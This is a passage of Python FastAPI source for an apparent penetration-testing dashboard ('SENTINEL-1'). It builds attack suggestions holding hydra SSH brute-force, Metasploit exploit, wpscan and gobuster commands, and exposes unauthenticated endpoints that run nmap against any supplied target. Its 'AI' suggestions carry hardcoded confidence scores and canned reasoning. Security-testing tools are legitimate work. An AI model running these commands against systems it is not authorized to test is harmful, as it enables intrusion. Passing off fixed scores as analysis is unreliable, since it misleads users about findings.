            elif 'xss' in vuln_name:
                tool = "beef"
                payload = f"BeEF framework targeting {target}"
            elif 'ssh' in vuln_name or 'credential' in vuln_name:
                tool = "hydra"
                payload = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target}"
            elif 'apache' in vuln_name or 'path' in vuln_name:
                tool = "metasploit"
                payload = f"msfconsole -q -x 'use exploit/multi/http/apache_normalization; set RHOSTS {target}; run'"
            elif 'wordpress' in vuln_name or 'wp' in vuln_name:
                tool = "wpscan"
                payload = f"wpscan --url {target} --enumerate vp"
            elif 'directory' in vuln_name:
                tool = "gobuster"
                payload = f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt"
            else:
                tool = "metasploit"
                payload = f"Generic exploit for {vuln.get('name', 'unknown')}"
            
            suggestion = {
                "type": "AI_ATTACK_SUGGESTION",
                "target": target,
                "vulnerability": vuln.get('name', 'Unknown Vulnerability') if isinstance(vuln, dict) else str(vuln),
                "severity": vuln.get('severity', 'MEDIUM') if isinstance(vuln, dict) else 'MEDIUM',
                "confidence": 0.95 if i == 0 else 0.85 if i == 1 else 0.75,
                "reasoning": f"Tool analysis confirms {vuln.get('name', 'vulnerability')} with high probability",
                "tool": tool,
                "payload_preview": payload,
                "commands": [
                    f"nmap -sV -p- {target}",
                    f"nikto -h {target}",
                    payload
                ]
            }
            suggestions.append(suggestion)
            
            # Emit each suggestion
            if sio:
                await sio.emit('ai_suggestion', suggestion)
        
        # Also emit correlation event for attack graph
        if sio:
            await sio.emit('correlation_event', {
            'type': 'CORRELATION',
            'message': f'Analyzed {len(all_vulnerabilities)} vulnerabilities from 12 tools',
            'critical_count': sum(1 for v in all_vulnerabilities if isinstance(v, dict) and v.get('severity') == 'CRITICAL'),
            'high_count': sum(1 for v in all_vulnerabilities if isinstance(v, dict) and v.get('severity') == 'HIGH'),
            'attack_paths': [
                {
                    'id': f'path_{i}',
                    'name': f'Attack path via {s["vulnerability"]}',
                    'probability': s['confidence']
                }
                for i, s in enumerate(suggestions)
            ]
        })
        
        # Mark as completed with all results
        scan_results[scan_id].update({
            "status": "completed",
            "progress": 100,
            "vulnerabilities_found": len(all_vulnerabilities),
            "critical_findings": sum(1 for v in all_vulnerabilities if isinstance(v, dict) and v.get('severity') == 'CRITICAL'),
            "suggestions": suggestions
        })
        
        logger.info(f"Neural analysis completed for {target} with {len(all_vulnerabilities)} vulnerabilities found")

    except Exception as e:
        logger.error(f"Error in neural analysis: {e}")
        import traceback
        traceback.print_exc()
        scan_results[scan_id] = {
            "status": "failed", 
            "error": str(e),
            "progress": 0
        }
        
        
@app.get("/api/metrics/summary")
async def get_metrics_summary():
    """Get metrics summary"""
    return {
        "system": {
            "uptime": time.time() - SENTINEL_START_TIME if 'SENTINEL_START_TIME' in globals() else 0,
            "gpu_available": CUDA_AVAILABLE
        },
        "metrics": {
            "attack_total": ATTACK_TOTAL._value.get() if 'ATTACK_TOTAL' in globals() else 0,
            "active_connections": len(manager.active_connections) if 'manager' in globals() else 0
        }
    }

# @app.get("/api/scan/status/{scan_id}")
# async def get_scan_status(scan_id: str):
#     # Check if the scan_id exists in our results dictionary
#     if scan_id not in scan_results:
#         # If not found, return 404
#         raise HTTPException(status_code=404, detail="Scan ID not found")
    
#     # Otherwise, return the current status
#     return scan_results[scan_id]
from prometheus_client import Counter, Gauge, Histogram, REGISTRY

def unregister_all_metrics():
    """Clear all metrics from registry to prevent duplicates on restart"""
    collectors = list(REGISTRY._collector_to_names.keys())
    for collector in collectors:
        try:
            REGISTRY.unregister(collector)
        except:
            pass
    print(f"🧹 Cleared {len(collectors)} metrics from registry")

def safe_create_metric(metric_type, name, documentation, labelnames=()):
    """Safely create a metric only if it doesn't already exist"""
    try:
        # Check if metric already exists in registry
        for collector in list(REGISTRY._collector_to_names.keys()):
            if hasattr(collector, '_name') and collector._name == name:
                return collector
        
        # Create new metric
        return metric_type(name, documentation, labelnames=labelnames)
    except Exception as e:
        print(f"⚠️ Error creating metric {name}: {e}")
        # Fallback: create without registering to the global REGISTRY
        return metric_type(name, documentation, labelnames=labelnames, registry=None)

# 1. Clear registry first
unregister_all_metrics()

# 2. Define metrics using the safe wrapper
SENTINEL_INFO = safe_create_metric(Gauge, 'sentinel_info', 'Sentinel-1 version info', labelnames=['version'])
ATTACK_TOTAL = safe_create_metric(Counter, "sentinel_attacks_total", "Total attacks executed", labelnames=["tool", "status"])
LAYER_PROCESSING_TIME = safe_create_metric(Histogram, 'layer_processing_time_seconds', 'Processing time per neural layer', labelnames=['layer'])

# # ==================== MAIN ENTRY POINT ====================
from prometheus_client import Counter, Gauge, Histogram, REGISTRY

# In your startup logic:
def unregister_metrics():
    # Attempt to clear existing metrics to prevent duplication error
    for collector in list(REGISTRY._collector_to_names.keys()):
        REGISTRY.unregister(collector)
import os

# Get the directory where fast6.py is located
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
# Call this before defining/registering your metrics




# Add this function to your fast6.py for better token handling
async def get_current_user_optional(
    token: str = Depends(oauth2_scheme),
    db: Session = Depends(get_db)
):
    """Get current user without raising exception - for optional auth"""
    if not token:
        return None
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")
        
        if username:
            user = db.query(User).filter(User.username == username).first()
            return user
    except Exception as e:
        print(f"Token verification failed (non-critical): {e}")
    
    return None

# Then use this for API endpoints that can work without auth
@app.get("/api/scans")
async def get_scans(
    current_user: User = Depends(get_current_user_optional),
    db: Session = Depends(get_db),
    page: int = 1,
    limit: int = 10
):
    """Get paginated scans - works with or without auth"""
    if not current_user:
        # Return empty or demo data for unauthenticated users
        return {
            "page": page,
            "limit": limit,
            "total": 0,
            "scans": []
        }
    
    scans = db.query(ScanHistory).filter(
        ScanHistory.user_id == current_user.id
    ).order_by(
        ScanHistory.timestamp.desc()
    ).offset((page-1) * limit).limit(limit).all()
    
    total = db.query(ScanHistory).filter(ScanHistory.user_id == current_user.id).count()
    
    return {
        "page": page,
        "limit": limit,
        "total": total,
        "scans": scans
    }
    
@app.post("/api/scan/start")
async def scan_start(request: Request, background_tasks: BackgroundTasks):
    data = await request.json()
    target = data.get("target")

    if not target:
        return {"status": "error", "message": "No target provided"}

    scan_id = str(uuid.uuid4())

    background_tasks.add_task(
        run_neural_attack_analysis,
        target,
        target,
        scan_id
    )

    return {
        "status": "started",
        "scan_id": scan_id
    }
import subprocess
import re

# @app.post("/api/sentinel/scan")
# async def neural_scan(request: Request):

#     data = await request.json()
#     target = data.get("target", "127.0.0.1")

#     print(f"🧠 Running REAL scan on {target}...")

#     try:
#         # Run nmap scan
#         result = subprocess.check_output(
#             ["nmap", "-sS", "-p-", target],
#             stderr=subprocess.STDOUT,
#             text=True
#         )

#         print("📡 Raw output:", result)

#         # Extract open ports
#         open_ports = re.findall(r"(\\d+)/tcp\\s+open", result)

#         open_ports = list(map(int, open_ports))

#         # Simple risk logic
#         risk = "low"
#         if len(open_ports) > 10:
#             risk = "high"
#         elif len(open_ports) > 3:
#             risk = "medium"

#         return {
#             "success": True,
#             "target": target,
#             "open_ports": open_ports,
#             "risk": risk,
#             "raw": result[:1000]  # limit output
#         }

#     except Exception as e:
#         print("❌ Scan error:", e)
#         return {"success": False, "error": str(e)}  
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
import subprocess
import re



@app.post("/api/scan")
async def scan(request: Request):
    data = await request.json()
    target = data.get("target", "127.0.0.1")

    print(f"🧠 Scan started: {target}")

    try:
        result = subprocess.check_output(
            ["nmap", "-sT", "-p-", target],
            stderr=subprocess.STDOUT,
            text=True
        )

        ports = re.findall(r"(\\d+)/tcp\\s+open", result)
        ports = list(map(int, ports))

        return JSONResponse({
            "success": True,
            "target": target,
            "ports": ports,
            "raw": result[:500]
        })

    except Exception as e:
        print("❌ Scan error:", e)
        return JSONResponse({
            "success": False,
            "error": str(e)
        })
        


@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    user = None  # or get_current_user()

    return templates.TemplateResponse(
        "dashboard.html",
        {
            "request": request,
            "user": user or {"username": "Guest"}
        }
    )
    


@fastapi_app.get("/results", response_class=HTMLResponse)
async def results_page(request: Request, db: Session = Depends(get_db)):
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        from jose import jwt
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")
        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login")
    except Exception:
        return RedirectResponse(url="/login")
    
    return templates.TemplateResponse("results.html", {
        "request": request,
        "user": user
    })
    
    
    
    
    
    
# =========================
import subprocess
import re

@app.post("/api/sentinel/scan")
async def neural_scan(request: Request):
    data = await request.json()
    target = data.get("target", "127.0.0.1")

    print(f"🧠 Real scan started on {target}")

    try:
        result = subprocess.check_output(
            ["nmap", "-sT", "-p-", target],
            stderr=subprocess.STDOUT,
            text=True
        )

        open_ports = re.findall(r"(\d+)/tcp\s+open", result)
        open_ports = list(map(int, open_ports))

        risk = "low"
        if len(open_ports) > 10:
            risk = "high"
        elif len(open_ports) > 3:
            risk = "medium"

        return {
            "success": True,
            "target": target,
            "open_ports": open_ports,
            "risk": risk
        }

    except Exception as e:
        print("❌ Scan error:", e)
        return {"success": False, "error": str(e)}

# =========================
if __name__ == "__main__":
    import uvicorn
    
    # 1. Clear existing metrics to avoid duplication on restart
    unregister_metrics()
    
    # 2. Use absolute paths for SSL files
    ssl_key = os.path.join(BASE_DIR, "key.pem")
    ssl_cert = os.path.join(BASE_DIR, "cert.pem")
    
    print("\n" + "=" * 60)
    print(" 🚀 Starting SENTINEL-1 Intelligence Engine (HTTPS)".center(60))
    print("=" * 60 + "\n")
    
    uvicorn.run(
        "fast6:app",
        host="0.0.0.0",
        port=9090,
        reload=False,
        log_level="info",
        ssl_keyfile=ssl_key,
        ssl_certfile=ssl_cert
    )

